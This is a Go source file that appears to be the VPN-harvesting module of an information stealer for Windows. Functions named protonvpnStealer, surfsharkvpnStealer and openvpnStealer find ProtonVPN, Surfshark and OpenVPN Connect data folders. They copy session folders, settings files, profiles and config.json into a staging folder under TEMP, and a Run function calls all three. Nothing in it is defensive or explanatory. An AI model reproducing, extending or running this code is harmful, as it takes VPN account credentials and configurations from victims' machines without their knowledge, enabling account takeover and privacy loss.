package vpn

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

func createDir(path string) error {
	return os.MkdirAll(path, os.ModePerm)
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	return err
}

func copyDir(src string, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		relativePath := path[len(src):]
		targetPath := filepath.Join(dst, relativePath)

		if info.IsDir() {
			return createDir(targetPath)
		}

		return copyFile(path, targetPath)
	})
}

func protonvpnStealer() {
	protonvpnFolder := filepath.Join(os.Getenv("LOCALAPPDATA"), "ProtonVPN")
	if _, err := os.Stat(protonvpnFolder); os.IsNotExist(err) {
		return
	}

	protonvpnAccount := filepath.Join(folderVPN, "ProtonVPN")
	createDir(protonvpnAccount)

	pattern := regexp.MustCompile(`^ProtonVPN_Url_[A-Za-z0-9]+$`)

	err := filepath.Walk(protonvpnFolder, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() && pattern.MatchString(info.Name()) {
			destinationPath := filepath.Join(protonvpnAccount, info.Name())
			copyDir(path, destinationPath)
		}
		return nil
	})

	if err != nil {
		fmt.Println("Error copying ProtonVPN directories:", err)
	}
}

func surfsharkvpnStealer() {
	surfsharkvpnFolder := filepath.Join(os.Getenv("APPDATA"), "Surfshark")
	if _, err := os.Stat(surfsharkvpnFolder); os.IsNotExist(err) {
		return
	}

	surfsharkvpnAccount := filepath.Join(folderVPN, "Surfshark")
	createDir(surfsharkvpnAccount)

	files := []string{"data.dat", "settings.dat", "settings-log.dat", "private_settings.dat"}

	for _, file := range files {
		srcPath := filepath.Join(surfsharkvpnFolder, file)
		dstPath := filepath.Join(surfsharkvpnAccount, file)

		if _, err := os.Stat(srcPath); err == nil {
			copyFile(srcPath, dstPath)
		}
	}
}

func openvpnStealer() {
	openvpnFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "OpenVPN Connect")
	if _, err := os.Stat(openvpnFolder); os.IsNotExist(err) {
		return
	}

	openvpnAccounts := filepath.Join(folderVPN, "OpenVPN")
	createDir(openvpnAccounts)

	profilesPath := filepath.Join(openvpnFolder, "profiles")
	if _, err := os.Stat(profilesPath); err == nil {
		copyDir(profilesPath, openvpnAccounts)
	}

	configPath := filepath.Join(openvpnFolder, "config.json")
	if _, err := os.Stat(configPath); err == nil {
		copyFile(configPath, openvpnAccounts)
	}
}

var folderVPN = filepath.Join(os.Getenv("TEMP"), strings.ToLower(os.Getenv("USERNAME")), "vpn")

func Run() {
	protonvpnStealer()
	surfsharkvpnStealer()
	openvpnStealer()
}
